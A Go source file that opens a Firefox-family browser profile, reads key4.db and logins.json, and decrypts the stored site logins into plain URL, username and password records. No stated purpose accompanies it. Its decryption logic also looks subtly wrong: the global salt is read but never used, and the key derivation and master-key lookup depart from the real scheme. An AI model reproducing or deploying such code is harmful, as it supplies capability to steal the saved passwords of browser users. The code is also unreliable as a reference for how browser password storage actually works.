package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"crypto/hmac"
	"crypto/sha1"
	"database/sql"
	"encoding/asn1"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/crypto/pbkdf2"
)

var (
	oidPBKDF2        = asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 5, 12}
	oidPBES2         = asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 5, 13}
	oidAES128CBC     = asn1.ObjectIdentifier{2, 16, 840, 1, 101, 3, 4, 1, 2}
	oidAES256CBC     = asn1.ObjectIdentifier{2, 16, 840, 1, 101, 3, 4, 1, 42}
	oidNSSPBESHA1DES = asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 12, 5, 1, 3}
)

type pkcs5AlgoID struct {
	Algorithm  asn1.ObjectIdentifier
	Parameters asn1.RawValue `asn1:"optional"`
}

type pbes2Param struct {
	KeyDerivation pkcs5AlgoID
	Encryption    pkcs5AlgoID
}

type pbkdf2Param struct {
	Salt      []byte
	Iteration int
	KeyLength int         `asn1:"optional"`
	PRF       pkcs5AlgoID `asn1:"optional"`
}

type encryptedKey struct {
	AlgoID pkcs5AlgoID
	Data   []byte
}

func GetGeckoMasterKey(profileDir, _ string) ([]byte, error) {
	key4Path := filepath.Join(profileDir, "key4.db")
	dsn := fmt.Sprintf("file:%s?mode=ro&immutable=1", key4Path)
	db, err := sql.Open("sqlite3", dsn)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	var item1, item2 []byte
	err = db.QueryRow("SELECT item1, item2 FROM metadata WHERE id = 'password'").Scan(&item1, &item2)
	if err != nil {
		return nil, err
	}

	var encKey encryptedKey
	if _, err := asn1.Unmarshal(item2, &encKey); err != nil {
		return nil, err
	}

	masterKey, err := DecryptGeckoKey(encKey, []byte{})
	if err != nil {
		return nil, err
	}

	return masterKey, nil
}

func DecryptGeckoKey(encKey encryptedKey, password []byte) ([]byte, error) {
	if encKey.AlgoID.Algorithm.Equal(oidPBES2) {
		return decryptPBES2(encKey.AlgoID.Parameters.FullBytes, password, encKey.Data)
	}
	if encKey.AlgoID.Algorithm.Equal(oidNSSPBESHA1DES) {
		return decryptNSSPBE(encKey.AlgoID.Parameters.FullBytes, password, encKey.Data)
	}
	return nil, fmt.Errorf("unsupported algorithm: %v", encKey.AlgoID.Algorithm)
}

func decryptPBES2(paramBytes []byte, password []byte, encData []byte) ([]byte, error) {
	var params pbes2Param
	if _, err := asn1.Unmarshal(paramBytes, &params); err != nil {
		return nil, fmt.Errorf("PBES2 params: %w", err)
	}

	var kdfParams pbkdf2Param
	if _, err := asn1.Unmarshal(params.KeyDerivation.Parameters.FullBytes, &kdfParams); err != nil {
		return nil, fmt.Errorf("PBKDF2 params: %w", err)
	}

	var iv []byte
	if _, err := asn1.Unmarshal(params.Encryption.Parameters.FullBytes, &iv); err != nil {
		return nil, fmt.Errorf("enc IV: %w", err)
	}
	keyLen := kdfParams.KeyLength
	if keyLen == 0 {
		if params.Encryption.Algorithm.Equal(oidAES256CBC) {
			keyLen = 32
		} else {
			keyLen = 16
		}
	}
	hashedPass := sha1.Sum(password)
	key := pbkdf2.Key(hashedPass[:], kdfParams.Salt, kdfParams.Iteration, keyLen, sha1.New)
	return aes128CBCDecrypt(key, iv, encData)
}

func decryptNSSPBE(paramBytes []byte, password []byte, encData []byte) ([]byte, error) {
	var params struct {
		Salt      []byte
		Iteration int
	}
	if _, err := asn1.Unmarshal(paramBytes, &params); err != nil {
		return nil, fmt.Errorf("nssPBE params: %w", err)
	}
	h := sha1.New()
	h.Write(params.Salt)
	h.Write(password)
	digest := h.Sum(nil)
	keyIV := nssKeyDerive(digest, params.Salt, password, params.Iteration, 32)
	if len(keyIV) < 32 {
		return nil, fmt.Errorf("nssPBE: key too short")
	}
	return des3CBCDecrypt(keyIV[:24], keyIV[24:32], encData)
}

func aes128CBCDecrypt(key, iv, data []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	bs := block.BlockSize()
	if len(data) < bs {
		return nil, fmt.Errorf("length of encrypted password less than block size")
	}
	mode := cipher.NewCBCDecrypter(block, iv[:bs])
	pt := make([]byte, len(data))
	mode.CryptBlocks(pt, data)
	if len(pt) == 0 {
		return pt, nil
	}
	pad := int(pt[len(pt)-1])
	if pad > bs || pad == 0 {
		return pt, nil
	}
	return pt[:len(pt)-pad], nil
}

func des3CBCDecrypt(key, iv, data []byte) ([]byte, error) {
	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		return nil, err
	}
	mode := cipher.NewCBCDecrypter(block, iv)
	pt := make([]byte, len(data))
	mode.CryptBlocks(pt, data)
	if len(pt) == 0 {
		return pt, nil
	}
	pad := int(pt[len(pt)-1])
	if pad > 8 || pad == 0 {
		return pt, nil
	}
	return pt[:len(pt)-pad], nil
}

func nssKeyDerive(digest, salt, password []byte, _ int, need int) []byte {
	var result []byte
	mac1 := hmac.New(sha1.New, digest)
	mac1.Write(salt)
	mac1.Write(password)
	h1 := mac1.Sum(nil)
	result = append(result, h1...)
	mac2 := hmac.New(sha1.New, digest)
	mac2.Write(h1)
	mac2.Write(salt)
	mac2.Write(password)
	h2 := mac2.Sum(nil)
	result = append(result, h2...)
	mac3 := hmac.New(sha1.New, digest)
	mac3.Write(h2)
	mac3.Write(salt)
	mac3.Write(password)
	h3 := mac3.Sum(nil)
	result = append(result, h3...)
	if len(result) > need {
		return result[:need]
	}
	return result
}

func DecryptGecko(masterKey, ciphertext []byte) ([]byte, error) {
	var encKey encryptedKey
	if _, err := asn1.Unmarshal(ciphertext, &encKey); err != nil {
		return nil, err
	}
	return DecryptGeckoKey(encKey, masterKey)
}

func extractGeckoPasswords(profileDir string) ([]Credential, error) {
	masterKey, err := GetGeckoMasterKey(profileDir, "")
	if err != nil {
		return nil, err
	}

	loginsPath := filepath.Join(profileDir, "logins.json")
	data, err := os.ReadFile(loginsPath)
	if err != nil {
		return nil, err
	}

	var lf geckoLoginFile
	if err := json.Unmarshal(data, &lf); err != nil {
		return nil, err
	}

	var results []Credential
	for _, entry := range lf.Logins {
		userBytes, err := base64.StdEncoding.DecodeString(entry.EncryptedUsername)
		if err != nil {
			continue
		}
		passBytes, err := base64.StdEncoding.DecodeString(entry.EncryptedPassword)
		if err != nil {
			continue
		}
		user, err := DecryptGecko(masterKey, userBytes)
		if err != nil {
			continue
		}
		pass, err := DecryptGecko(masterKey, passBytes)
		if err != nil {
			continue
		}
		results = append(results, Credential{
			URL:      entry.Hostname,
			Username: string(user),
			Password: string(pass),
		})
	}
	return results, nil
}
